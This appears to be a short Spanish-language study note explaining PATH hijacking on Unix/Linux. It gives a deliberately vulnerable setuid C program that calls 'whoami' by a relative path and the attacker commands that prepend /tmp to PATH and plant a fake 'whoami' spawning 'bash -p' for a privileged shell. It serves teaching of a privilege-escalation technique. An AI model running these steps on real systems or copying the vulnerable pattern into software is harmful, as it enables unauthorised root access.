-- - 
PATH Hijacking es una técnica utilizada por los atacantes para secuestrar comandos de un sistema Unix/Linux mediante la manipulación del PATH. El PATH es una variable de entorno que define las rutas de búsqueda para los archivos ejecutables en el sistema.

### Ejemplo: 
*Maquina victima*
```c
#include <stdio.h> 

int main(){
	setuid(0);
	printf("\n[*] Actualmente somos el suigiuiente usuario:\n\n"); 
	system("/usr/bin/whoami");
	printf("\n[+] Actualmente somos el suigiente usuario:\n\n");
	system("whoami");
	return 0;
}
```
*Atacante:*

```bash
echo $PATH 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

export PATH=/tmp/:$PATH 
echo "bash -p" > whoami

```
